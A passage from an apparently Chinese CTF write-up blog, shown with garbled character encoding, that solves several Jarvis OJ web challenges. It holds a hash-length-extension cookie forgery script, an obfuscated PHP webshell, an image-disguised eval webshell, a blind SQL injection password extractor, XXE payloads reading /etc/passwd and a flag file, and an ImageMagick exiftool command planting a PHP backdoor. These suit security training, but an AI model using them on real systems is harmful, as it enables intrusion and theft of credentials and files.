å¯†ï¼Œå¦‚æœç”¨æˆ·ä¿®æ”¹äº† cookie ä¸­çš„<code>role</code>ï¼Œåˆ™æ­¤å¼ºæ¯”è¾ƒå¤±è´¥</p><p>æœ€åå¦‚æœä¸¤ä¸ªå¼ºæ¯”è¾ƒéƒ½ä¸ºçœŸï¼Œ<code>$auth</code>ä¸ºçœŸï¼Œç»™ flag</p><p>æ˜¯ä¸€ä¸ªç»å…¸çš„<strong>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</strong></p><blockquote><p>å‚è€ƒèµ„æ–™</p><p><a href="https://www.freebuf.com/articles/web/69264.html">æ·±å…¥ç†è§£hashé•¿åº¦æ‰©å±•æ”»å‡»ï¼ˆsha1ä¸ºä¾‹ï¼‰</a></p><p><a href="https://www.freebuf.com/articles/web/31756.html">ç§‘æ™®å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»(Hash Length Extension Attacks)</a></p><p><a href="https://blog.csdn.net/syh_486_007/article/details/51228628?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.baidujs&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.baidujs">hashå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»è§£æï¼ˆè®°å½•ä¸€ä¸‹ï¼Œä¿è¯ä¸å¿˜ï¼‰</a></p><p><a href="https://blog.csdn.net/szuaurora/article/details/78125585?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.baidujs&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.baidujs">é•¿åº¦æ‰©å±•æ”»å‡»è¯¦è§£</a></p></blockquote><p>æˆ‘å¯¹å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»çš„ç†è§£ï¼Œçœ‹äº†å°åŠä¸ªä¸‹åˆï¼Œæ„Ÿè§‰æ‘¸åˆ°ä¸€ç‚¹å¤´ç»ª</p><p>ä¸¾ä¸ªä¾‹å­ç®€å•æ¥è¯´ï¼Œå‡è®¾åŠ å¯†å­—ç¬¦ä¸²<code>123456</code>ï¼Œç›ä¸º<code>600</code>ï¼ŒåŠ å¯†æ—¶å€™ï¼Œå¾…åŠ å¯†å­—ç¬¦ä¸²ä¸º<code>600123456</code>ï¼Œå¼€å§‹è¡¥ 0 ï¼Œè¡¥åˆ°é•¿åº¦ä¸º 4 çš„å€æ•°ï¼Œæ­¤æ—¶å­—ç¬¦ä¸²ä¸º<code>600123456000</code>ï¼Œç„¶åå››ä¸ªå››ä¸ªåˆ‡å¼€æ±‚å’Œï¼Œ<code>6001+2345+6000=14346</code>ä½œä¸º hash çš„å€¼ï¼Œæœ€åæŠ¹æ‰ä¸€ä½ç»™ç”¨æˆ·ï¼Œç”¨æˆ·æ‹¿åˆ°<code>143X6</code>ï¼Œ<strong>æ­¤æ—¶å¼€å§‹é•¿åº¦æ‰©å±•æ”»å‡»</strong>ï¼Œç”¨æˆ·è¾“å…¥<code>1234560001234</code>ï¼ŒåŠ ç›ä»¥åè¡¥ 0 å¾—åˆ°<code>6001234560001234</code>ï¼Œè®¡ç®—<code>6001+2345+6000+1234=15580</code>ï¼Œç”¨æˆ·å¾—åˆ°ä¸€ä¸ª<code>15X80</code>ï¼Œç°åœ¨çŸ¥é“äº†<code>15X80=143X6+1234</code>ï¼Œçˆ†ç ´å°±èƒ½å¤Ÿå¾—åˆ°<code>123456</code>çš„ hash å€¼ä¸º<code>14346</code></p><p>ç†è§£ä¸€ä¸‹åŸç†ï¼Œå°±æ˜¯éœ€è¦ hash çš„å­—ç¬¦ä¸²åœ¨è¿›è¡ŒåŠ å¯†çš„æ—¶å€™ï¼Œæ˜¯åˆ†æˆå‡ ç»„å­—ç¬¦å­ä¸²ï¼Œåˆ†ç»„è¿›è¡ŒåŠ å¯†çš„ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨<strong>è¦†ç›–</strong>çš„å…³ç³»ï¼Œå½“ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†ç»„è¿›è¡ŒåŠ å¯†è¿‡åå¾—åˆ°çš„ hash å€¼ï¼Œå®ƒæ˜¯ä½œä¸ºä¸‹ä¸€ç»„å­—ç¬¦ä¸²è¿›è¡Œ hash åŠ å¯†æ—¶å€™çš„<code>registers</code>å€¼ï¼ˆç›ï¼‰ï¼Œå¯ä»¥ç†è§£ä¸º<code>hash(registers1+å­—ç¬¦ä¸²ç»„2)=registers2</code>ï¼Œ<strong>æˆ‘ç†è§£ä¸ºä¸Šä¸€ç»„çš„ç»“æœä½œä¸ºä¸‹ä¸€ç»„çš„ç›</strong>ï¼Œç›´åˆ°æœ€åä¸€ç»„è¿›è¡ŒåŠ å¯†å®Œæˆï¼Œæœ€åä¸€ç»„çš„<code>registers</code>å€¼å°±æ˜¯ hash çš„æœ€ç»ˆå€¼ï¼Œ<strong>å› ä¸º hash è®¡ç®—ç»“æœæ˜¯å”¯ä¸€çš„</strong></p><p><strong>å¦‚æœ salt çš„å€¼ä¸çŸ¥é“ï¼Œä½†æ˜¯çŸ¥é“é•¿åº¦ï¼ŒåˆçŸ¥é“ sha1(salt)ï¼Œé‚£ä¹ˆå°±ä¹Ÿå°±å¯ä»¥çŸ¥é“ sha1(salt+â€œå¡«å……æ•°æ®â€+â€œä»»æ„å¯æ§æ•°æ®â€)ã€‚è¿™é‡Œçš„ salt+â€œå¡«å……æ•°æ®â€ å°±æ˜¯å¯¹ salt è¿›è¡Œ sha1 æ—¶æ‰€è¡¥å…¨çš„æ•°æ® + æœ€å8ä½çš„é•¿åº¦æè¿°ç¬¦ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œsalt+â€å¡«å……æ•°æ®â€çš„é•¿åº¦å°±æ˜¯64å­—èŠ‚ï¼Œæ­£å¥½æ˜¯ä¸€ä¸ªåˆ†ç»„ã€‚å¦‚æœsaltçš„é•¿åº¦å°±å¤§äºäº†56ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆåŠ å…¥å¡«å……æ•°æ®åçš„é•¿åº¦åº”è¯¥æ˜¯Nä¸ª64å­—èŠ‚ï¼Œç­‰äºNä¸ªåˆ†ç»„ã€‚</strong></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218163726.png"></p><p>ç†ä¸€ä¸‹æ€è·¯ï¼Œå¦‚æœè¿›è¡Œâ€œå¤æ‚æ•°å­¦å˜åŒ–â€æ—¶è¾“å…¥çš„<code>registers</code>å€¼å’Œè¯¥æ¬¡è¿ç®—çš„å­—ç¬¦ä¸²åˆ†ç»„ç›¸åŒï¼Œé‚£ä¹ˆä»–ä»¬å„è‡ªç”Ÿæˆçš„æ–°çš„<code>registers</code>å€¼ä¹Ÿç›¸åŒï¼Œæˆ‘ä»¬ç°åœ¨éœ€è¦ä¼ªé€ çš„ cookie æ˜¯<code>&#123;s:5:&quot;admin&quot;&#125;</code>ï¼Œå·²çŸ¥äº†ä¸€ä¸ª<code>registers</code>å€¼ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¬¡åŠ å¯†<code>&#123;s:5:&quot;guset&quot;&#125;</code>åçš„ cookie ï¼Œ<strong>æˆ‘ä»¬éœ€è¦çˆ†ç ´å‡ºç›çš„é•¿åº¦ï¼Œç„¶åå¡«å……æˆä¸ªå­—ç¬¦ä¸²åˆ†ç»„ï¼Œè®©å¢åŠ çš„<code>&#123;s:5:&quot;admin&quot;&#125;</code>å­—ç¬¦ä¸²å˜æˆä¸‹ä¸€ç»„å­—ç¬¦ä¸²åˆ†ç»„ï¼Œè®©ç¬¬ä¸€æ¬¡åŠ å¯†åçš„ cookie å½“ä½œåŠ å¯†<code>&#123;s:5:&quot;admin&quot;&#125;</code>æ—¶å€™çš„ç›</strong>ï¼Œè¿™æ ·å°±èƒ½ç»•è¿‡äº†</p><p>æœ€åçš„è„šæœ¬æ¥è‡ªç™¾åº¦ï¼Œè¿˜æœ‰ä¸€ä¸ªè¦æ³¨æ„çš„ç‚¹å°±æ˜¯ï¼Œ<strong>PHPåœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šå¿½ç•¥åé¢å¤šä½™çš„å­—ç¬¦</strong>ï¼Œå¦‚æœæˆ‘ä»¬çš„ <code>role</code>ä¸º<code> &#123;&#39;s:5:&quot;admin&quot;;\x00\x00\x00\x00\x00\x00\x00\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80s:5:&quot;guest&quot;;&#39;&#125;</code>ï¼Œååºåˆ—åŒ–æ—¶åªæœ‰<code>&#123;s:5:&quot;admin&quot;&#125;</code>è¿™äº›å†…å®¹è¢«è§£æ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,hashpumpy,urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://web.jarvisoj.com:32778/&#x27;</span></span><br><span class="line"></span><br><span class="line">    old_cookie = <span class="string">&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;</span></span><br><span class="line">    str1 = <span class="string">&#x27;s:5:&quot;guest&quot;;&#x27;</span></span><br><span class="line">    str2 = <span class="string">&#x27;s:5:&quot;admin&quot;;&#x27;</span></span><br><span class="line">    str1 = str1[::-<span class="number">1</span>]                           <span class="comment">#å€’è¿‡æ¥,è¿™é“é¢˜è¦roleçš„å€¼åè¿‡æ¥æ±‚md5</span></span><br><span class="line">    str2 = str2[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):                       <span class="comment">#ç”¨äºçˆ†ç ´saltçš„é•¿åº¦</span></span><br><span class="line">        new_cookie,message = hashpumpy.hashpump(old_cookie,str1,str2,i)</span><br><span class="line">        payload = &#123;<span class="string">&#x27;role&#x27;</span>:urllib.parse.quote(message[::-<span class="number">1</span>]),<span class="string">&#x27;hsh&#x27;</span>:new_cookie&#125;           <span class="comment">#quote()å¯ä»¥æŠŠ \x00 å˜æˆ %00</span></span><br><span class="line">        ans = requests.get(url,cookies = payload)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(ans.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">in</span> ans.text:</span><br><span class="line">            <span class="built_in">print</span>(ans.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(urllib.parse.quote(&#x27;\x00&#x27;))</span></span><br><span class="line">attack()</span><br></pre></td></tr></table></figure><h1 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h1><p>è¿›å»ä¸€ä¸ªèœåˆ€çš„å›¾ç‰‡ï¼Œç„¶åæœ‰ä¸ªç®¡ç†å‘˜ç™»é™†çš„æŒ‰é’®ï¼Œç‚¹è¿›å»å¼¹ç™»é™†é”™è¯¯ï¼Œæºç ä¸­æœ‰æç¤ºç®¡ç†å‘˜çš„ IP ï¼š<code>&#39;admin ip is 202.5.19.128&#39;</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218193537.png"></p><p>èœåˆ€ç›®å½•ä¸‹çš„æºç ä¸­æœ‰æç¤ºä¸€ä¸ª<code>proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg</code></p><p>æ‰€ä»¥å°±æ˜¯å¥—äº†ä¸€å±‚å¨ƒï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰«ç›®å½•æ‰«åˆ°ä¸€ä¸ª<code>robots.txt</code>ç„¶åé‡Œé¢æœ‰ä¸¤ä¸ªæ–‡ä»¶åå­—<code>trojan.php</code>å’Œ<code>trojan.php.txt</code>ï¼Œåè€…é‡Œé¢æ˜¯ä¸ªğŸ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $&#123;(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>)&#125;=(<span class="string">&quot;!&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;(</span></span><br><span class="line"><span class="string">&quot;</span>^<span class="string">&quot;&#123;&quot;</span>).(<span class="string">&quot;(&quot;</span>^<span class="string">&quot;[&quot;</span>).(<span class="string">&quot;~&quot;</span>^<span class="string">&quot;;&quot;</span>).(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;.&quot;</span>).(<span class="string">&quot;*&quot;</span>^<span class="string">&quot;~&quot;</span>);$&#123;(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>)&#125;</span><br><span class="line">((<span class="string">&quot;-&quot;</span>^<span class="string">&quot;H&quot;</span>). (<span class="string">&quot;]&quot;</span>^<span class="string">&quot;+&quot;</span>). (<span class="string">&quot;[&quot;</span>^<span class="string">&quot;:&quot;</span>). (<span class="string">&quot;,&quot;</span>^<span class="string">&quot;@&quot;</span>). (<span class="string">&quot;&#125;&quot;</span>^<span class="string">&quot;U&quot;</span>). (<span class="string">&quot;e&quot;</span>^<span class="string">&quot;A&quot;</span>). (<span class="string">&quot;(&quot;</span>^<span class="string">&quot;w&quot;</span>).</span><br><span class="line">(<span class="string">&quot;j&quot;</span>^<span class="string">&quot;:&quot;</span>). (<span class="string">&quot;i&quot;</span>^<span class="string">&quot;&amp;&quot;</span>). (<span class="string">&quot;#&quot;</span>^<span class="string">&quot;p&quot;</span>). (<span class="string">&quot;&gt;&quot;</span>^<span class="string">&quot;j&quot;</span>). (<span class="string">&quot;!&quot;</span>^<span class="string">&quot;z&quot;</span>). (<span class="string">&quot;T&quot;</span>^<span class="string">&quot;g&quot;</span>). (<span class="string">&quot;e&quot;</span>^<span class="string">&quot;S&quot;</span>).</span><br><span class="line">(<span class="string">&quot;_&quot;</span>^<span class="string">&quot;o&quot;</span>). (<span class="string">&quot;?&quot;</span>^<span class="string">&quot;b&quot;</span>). (<span class="string">&quot;]&quot;</span>^<span class="string">&quot;t&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ä¸Šè¿°ä»£ç ä¿å­˜ä¸ºphpé¡µé¢è¿è¡Œä¸€ä¸‹ï¼Œå¾—åˆ°Warningï¼š</span><br><span class="line">Warning: <span class="title function_ invoke__">assert</span>() [function.assert]: Assertion <span class="string">&quot;eval(<span class="subst">$_POST</span>[360])&quot;</span> failed</span><br><span class="line">in C:\phpstudy\WWW\b.php on line <span class="number">1</span></span><br></pre></td></tr></table></figure><p><code>trojan.php</code>æ˜¯ shell çš„é¡µé¢ï¼Œèšå‰‘è¿å°±è¡Œäº†</p><h1 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h1><p>æ–‡ä»¶ä¸Šä¼ </p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218202805.png"></p><p>ä¼ äº†ä¸€ä¸ªç»å…¸çš„å›¾ç‰‡ğŸï¼Œå¾—åˆ°äº†<code>å›¾ç‰‡IDï¼š1613651325 </code>ï¼Œè·¯å¾„æ˜¯<code>/uploads/xxxxxx.jpg</code>ï¼Œåœ¨<code>view</code>é¡µé¢çš„ url æœ‰<code>?page=view</code>ï¼ŒçŒœæµ‹ page å‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªè·¯å¾„ï¼Œå¡«äº†å›¾ç‰‡çš„è·¯å¾„ï¼Œç„¶åæœ‰æŠ¥é”™ï¼Œä¼šç»™æ–‡ä»¶è‡ªåŠ¨æ·»åŠ <code>.php</code>åç¼€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ma2.jpg</span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt; </span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218202947.png"></p><p>ä½†æ˜¯åœ¨<code>view</code>é¡µé¢ç›´æ¥å¡«å†™å›¾ç‰‡ ID å’Œå›¾ç‰‡ç±»å‹å°±å¯ä»¥è®¿é—®åˆ°å›¾ç‰‡</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218203440.png"></p><p>èšå‰‘è¿ä¸ä¸Šï¼Œæœ€åæ˜¯ç”¨<code>%00</code>æˆªæ–­æ‹¿åˆ° flag</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218203824.png"></p><h1 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h1><p>æœ‰<code>ç”¨æˆ·åé”™è¯¯</code>å’Œ<code>å¯†ç é”™è¯¯</code>ä¸¤ç§å›æ˜¾ï¼Œæ‰€ä»¥ç¡®å®šæœ‰<code>admin</code>è´¦å·ï¼Œfuzz å‡ºæ¥ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨<code>/**/</code>ä»£æ›¿ï¼Œç›²æ³¨æ‰“å‡ºå¯†ç </p><p>ç›´æ¥ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://web.jarvisoj.com:32787/login.php&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;å¯†ç é”™è¯¯&quot;</span></span><br><span class="line">chars = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;start!&#x27;</span>)</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;user&#x27;/**/or/**/mid((select/**/password/**/from/**/admin),%s,1)=&#x27;%s&#x27;#&quot;</span> % (i, j),</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;1&#x27;#&quot;</span>&#125;</span><br><span class="line">        res = requests.post(url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> res:</span><br><span class="line">            password += j</span><br><span class="line">            <span class="built_in">print</span>(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;end!&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210219000635.png"></p><p>è§£md5åå¾—:<code>eTAloCrEP</code>ï¼Œç™»å½•æ‹¿åˆ° flag</p><h1 id="apiè°ƒç”¨"><a href="#apiè°ƒç”¨" class="headerlink" title="apiè°ƒç”¨"></a>apiè°ƒç”¨</h1><p>è¿™é¢˜æ˜¯å‰©ä¸‹æ²¡åšè¿‡çš„ï¼Œslim æ¶æ„çš„ xxe æ¼æ´ï¼Œé¢˜ç›®æç¤ºæ˜¯<strong>è¯·è®¾æ³•è·å¾—ç›®æ ‡æœºå™¨ &#x2F;home&#x2F;ctf&#x2F;flag.txt ä¸­çš„ flag å€¼</strong></p><blockquote><p>å‚è€ƒèµ„æ–™</p><p><a href="https://www.leavesongs.com/PENETRATION/slim3-xxe.html">phpæ¡†æ¶slimæ¶æ„ä¸Šå­˜åœ¨XXEæ¼æ´ï¼ˆXXEçš„å…¸å‹å­˜åœ¨å½¢å¼ï¼‰</a></p></blockquote><p>æŠ“åŒ…å¾—åˆ° jsonï¼Œæºç æ˜¯åˆ©ç”¨äº† ajax ï¼ŒæŠŠ json æ”¹ä¸º xmlï¼ŒæŠŠå¤´ä¸­çš„ Content-Typeæ”¹ä¸º application&#x2F;xmlï¼Œåˆ©ç”¨ xxe æ‰“å‡º flag</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210219001745.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///home/ctf/flag.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ° flag</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210219001839.png"></p><h1 id="å›¾ç‰‡ä¸Šä¼ æ¼æ´"><a href="#å›¾ç‰‡ä¸Šä¼ æ¼æ´" class="headerlink" title="å›¾ç‰‡ä¸Šä¼ æ¼æ´"></a>å›¾ç‰‡ä¸Šä¼ æ¼æ´</h1><p>è¿™é¢˜ç°åœ¨å·²ç»æŒ‚äº†ï¼Œä½†æ˜¯ä¹‹å‰å·²ç»åšè¿‡äº†ï¼Œå‚è€ƒåˆ«äººçš„å†™ä¸€é wp å§</p><blockquote><p>å‚è€ƒèµ„æ–™</p><p><a href="https://www.2cto.com/article/201605/505823.html">CVE-2016-3714 - ImageMagick å‘½ä»¤æ‰§è¡Œåˆ†æ</a></p></blockquote><p>å…ˆç”¨ exiftool ç”Ÿæˆä¸€ä¸ªä¸€å¥è¯åé—¨ è·¯å¾„ç”± phpinfo å¾—åˆ°</p><p><code>exiftool -label=&quot;\&quot;|/bin/echo \&lt;?php \@eval\(\\$\_POST\[x\]\)\;?\&gt; &gt; /opt/lampp/htdocs/uploads/x.php; \&quot;&quot; 1.png</code> </p><p>æ¥ç€ä¸Šä¼ è¯¥æ–‡ä»¶ </p><p>ç„¶åä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™éœ€è¦æ³¨æ„éœ€è¦ <strong>filetype&#x3D;show</strong> æˆ–è€… <strong>filetype&#x3D;win</strong>ï¼ŒåŸå› å°±æ˜¯æ–‡ç« ä¸­åŸè¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¸ªæ–¹æ³•é¸¡è‚‹ä¹‹å¤„åœ¨äºï¼Œå› ä¸ºdelegate.xmlä¸­é…ç½®çš„encode=&quot;show&quot;ï¼ˆæˆ–&quot;win&quot;ï¼‰ï¼Œæ‰€ä»¥åªæœ‰è¾“å‡ºä¸º.showæˆ–.winæ ¼å¼çš„æƒ…å†µä¸‹æ‰ä¼šè°ƒç”¨è¿™ä¸ªå§”æ‰˜ï¼Œè€Œæ™®é€šçš„æ–‡ä»¶å¤„ç†æ˜¯ä¸ä¼šè§¦å‘è¿™ä¸ªå‘½ä»¤çš„ã€‚</span><br></pre></td></tr></table></figure><p>èšå‰‘è¿<code>x.php</code>å¯†ç ä¸º<code>x</code></p><h1 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h1><blockquote><p>å‚è€ƒèµ„æ–™</p><p><a href="https://www.cnblogs.com/sijidou/p/10455646.html">PHPååºåˆ—åŒ–ä¸Session</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">new</span> <span class="title function_ invoke__">OowoO</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯é“ php åºåˆ—åŒ–æ¼æ´çš„é¢˜ç›®<br> 1.åŸç†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);</span><br></pre></td></tr></table></figure><p>ä¸‰ç§å¤„ç† session çš„æ–¹å¼ä¸åŒ </p><ul><li>php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡ serialize() å‡½æ•°åºåˆ—å¤„ç†çš„å€¼</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 